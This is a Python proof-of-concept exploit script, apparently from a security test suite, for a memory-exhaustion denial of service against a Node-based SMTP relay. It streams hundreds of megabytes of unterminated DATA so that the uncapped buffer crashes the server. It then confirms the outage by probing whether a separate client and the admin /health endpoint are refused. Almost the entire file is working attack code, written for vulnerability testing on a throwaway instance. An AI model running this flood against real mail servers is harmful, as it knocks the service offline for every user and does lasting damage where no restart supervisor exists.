#!/usr/bin/env python3
"""
PoC #5: Unbounded DATA size / no line-length cap -> memory-exhaustion DoS
----------------------------------------------------------------------------
Location: SmtpSession.onDataLine() in src/smtp.js (called from drain() while
`state === 'data'`). Every line read during the DATA phase is pushed onto
`this.dataLines` with no running total-size check and no per-line-length
check; `this.buffer` itself also has no cap on how far it may grow while
waiting for the next '\\n'. A real server enforces both: RFC 5321 §4.5.3.1.6
caps a single line at 1000 octets, and the SIZE extension (RFC 1870) lets a
server advertise and enforce a maximum total message size, rejecting
oversized DATA with "552 message size exceeds fixed limit". This server does
neither - a client can stream an arbitrarily large message, all accepted and
buffered in memory, with no rejection at any point.

CONFIRMATION IS BY LIVENESS / BYSTANDER IMPACT, NOT BY THE ATTACK SESSION'S
OWN FATE. It is not enough to show that "my own oversized message was
accepted" - that only proves the missing cap, not a denial of service (a
per-request failure hurts only that one request). What proves the DoS is that
a SEPARATE, ordinary client is denied service while / after the attack runs.

So we (0) baseline: a normal SMTP transaction from a separate connection
succeeds AND the admin /health endpoint answers "ok"; (1) attack: open one
DATA phase and stream a few hundred MB of body with NO terminating '.', so it
is never written to disk - it just accumulates in this.dataLines/this.buffer
in memory; (2) re-probe liveness from a separate client. Node auto-sizes V8's
old-space heap to the container's memory limit (512m in vuln_tests/
docker-compose.yml), so the unbounded buffer crosses that ceiling and Node
aborts with a fatal "JavaScript heap out of memory" at ~240MB of buffered
DATA. There is NO restart supervisor (entrypoint.sh just execs node, no
compose restart: policy), so the process stays dead: the SMTP port and the
admin port both stop answering for EVERYONE. The DoS is confirmed only if the
separate bystander (normal SMTP transaction + /health) is denied afterward;
if the bystander is still served, the buffer only bloated one session and
this is reported as NOT a full DoS.

WARNING: this genuinely takes the target down (Node aborts and does not
restart) - run it against a throwaway instance.

Run: python3 05_unbounded_data_dos.py [host] [port] [admin_port] [max_mb]
     defaults: 127.0.0.1 2525 8081 600
"""
import os
import socket
import sys
import time
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
# The domain this relay delivers LOCALLY for (config.DOMAIN / MTA_DOMAIN). Mail
# to this domain is accepted from anyone, so both the bystander probe and this
# PoC's own attack session reach the DATA phase regardless of whether the
# unrelated open-relay vuln (#1) has been closed - keeping #5 (unbounded DATA)
# tested in isolation instead of false-erroring on a relay rejection.
DOMAIN = os.environ.get("MTA_DOMAIN", "mta.local")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
# Upper bound on how much unterminated DATA to stream before giving up. The
# heap abort reproducibly fires near ~240MB under the 512m container cap, so
# 600MB is a generous ceiling that still stops quickly if a size cap is added.
MAX_MB = int(sys.argv[4]) if len(sys.argv) > 4 else 600

# Liveness re-probe window after the attack. The abort is effectively
# instant and permanent (no restart), so this only needs to tolerate the
# moment between the buffer crossing the heap ceiling and the process exiting.
# A crashed relay refuses connections immediately, so two consecutive denials at
# a 1s cadence confirm in ~2s; the window only bounds the no-DoS case. Kept tight
# (was 20s/2s) so neither path approaches the per-PoC budget.
LIVENESS_WINDOW = 12
LIVENESS_INTERVAL = 1.0
HEALTH_TIMEOUT = 3


def read_reply(sock, timeout=10):
    sock.settimeout(timeout)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line, timeout=10):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock, timeout)


def normal_txn(timeout=10):
    """A well-behaved, small SMTP transaction from a SEPARATE connection - the
    bystander. Returns (ok, detail); ok is True only on a '250 ... queued'."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        read_reply(s)
        cmd(s, "EHLO bystander.example")
        cmd(s, "MAIL FROM:<bystander@example.com>")
        # Local delivery (see DOMAIN) so this liveness probe is served whether or
        # not the unrelated open-relay vuln (#1) has been closed.
        cmd(s, f"RCPT TO:<alice@{DOMAIN}>")
        r = cmd(s, "DATA")
        if not r.startswith("354"):
            s.close()
            return False, f"DATA refused: {r.strip()!r}"
        r = cmd(s, "Subject: bystander liveness probe\r\n\r\nordinary mail.\r\n.")
        s.close()
        return r.startswith("250"), r.strip()
    except (OSError, socket.timeout) as e:
        # Connection refused / reset == the shared relay is not serving.
        return False, type(e).__name__


def probe_health(timeout=HEALTH_TIMEOUT):
    """Return (up, detail). up=True only if GET /health answers 200 ok."""
    try:
        with urllib.request.urlopen(
            f"http://{HOST}:{ADMIN_PORT}/health", timeout=timeout
        ) as r:
            body = r.read().decode(errors="replace")
            return (r.status == 200 and "ok" in body), f"{r.status} {body.strip()!r}"
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, type(e).__name__


def bystander_ok():
    """Both liveness signals from separate clients must hold for 'served'."""
    up, hd = probe_health()
    ok, td = normal_txn()
    return up and ok, f"/health={hd}; smtp={td}"


def stream_unbounded_data():
    """Open one DATA phase and stream newline-terminated ~1MB lines - each
    pushed onto this.dataLines (VULN #5: no total-size cap) - and NEVER send
    the terminating '.', so nothing is written to disk; it all piles up in
    memory. Return the MB streamed before the connection died (or MAX_MB)."""
    s = socket.create_connection((HOST, PORT), timeout=15)
    read_reply(s)
    cmd(s, "EHLO attacker.example")
    cmd(s, "MAIL FROM:<flood@attacker.example>")
    # Local delivery so we reach DATA even on a server that has closed the open
    # relay (#1); this PoC targets the unbounded DATA buffer (#5), not relaying.
    cmd(s, f"RCPT TO:<sink@{DOMAIN}>")
    r = cmd(s, "DATA")
    if not r.startswith("354"):
        s.close()
        raise RuntimeError(f"DATA rejected before we could stream: {r.strip()!r}")
    s.sendall(b"Subject: unbounded-data-flood\r\n\r\n")

    line = b"A" * (1024 * 1024) + b"\r\n"  # 1MB body line, no size cap anywhere
    sent = 0
    t0 = time.time()
    try:
        while sent < MAX_MB * 1024 * 1024:
            s.sendall(line)
            sent += len(line)
            if sent % (50 * 1024 * 1024) < len(line):
                print(f"[*]   streamed ~{sent // 1024 // 1024}MB of uncapped DATA "
                      f"(no '.' sent, all buffered in memory) "
                      f"[{time.time() - t0:.1f}s]")
    except (OSError, socket.timeout) as e:
        print(f"[*] attack connection dropped after ~{sent // 1024 // 1024}MB "
              f"({type(e).__name__}: {e}) - the relay stopped reading; now "
              "checking whether it died for everyone")
    finally:
        try:
            s.close()
        except OSError:
            pass
    return sent // 1024 // 1024


def main():
    # 0) Baseline: a separate ordinary client must be served before we attack.
    ok, detail = bystander_ok()
    if not ok:
        print(f"[!] Pre-check: bystander not served ({detail}); is MTA running "
              "and healthy? Cannot run a DoS test against an already-down relay.")
        return 2
    print(f"[*] Pre-check: bystander served OK ({detail})")

    print(f"[*] Attacking: streaming up to {MAX_MB}MB of unterminated DATA "
          "through the DATA phase with no size/line-length cap (VULN #5) ...")
    try:
        streamed = stream_unbounded_data()
    except RuntimeError as e:
        # A patched server refused DATA before we could stream (e.g. it enforces
        # a cap up front). The oversized stream never reached the buffer, so the
        # DoS is not exploitable - score FIXED rather than could-not-run.
        print(f"[-] {e} - the oversized stream was refused up front; not a DoS.")
        return 1
    print(f"[*] Attack streamed ~{streamed}MB with zero rejection at any point")

    # 2) Liveness watch: is a SEPARATE client denied, not just this session?
    print(f"[*] Re-probing bystander liveness for up to {LIVENESS_WINDOW}s ...")
    deadline = time.time() + LIVENESS_WINDOW
    down_streak = 0
    last = ""
    while time.time() < deadline:
        ok, detail = bystander_ok()
        last = detail
        if ok:
            down_streak = 0
        else:
            down_streak += 1
            print(f"[*]   bystander denied ({detail}) [{down_streak} consecutive]")
            if down_streak >= 2:
                print("[+] Unbounded-DATA DoS confirmed - a separate ordinary "
                      "client is now denied (SMTP + admin /health both stopped "
                      "answering). Node exhausted its heap on the uncapped DATA "
                      "buffer and aborted; with no restart supervisor the whole "
                      "relay is down for everyone, not just the attack session.")
                return 0
        time.sleep(LIVENESS_INTERVAL)

    print(f"[-] Bystander still served at end of window (last: {last}). The "
          "oversized DATA bloated only the attack session but did NOT deny the "
          "service - not a full DoS (a size/line-length cap may now be enforced, "
          "or the heap absorbed it; try a larger max_mb).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
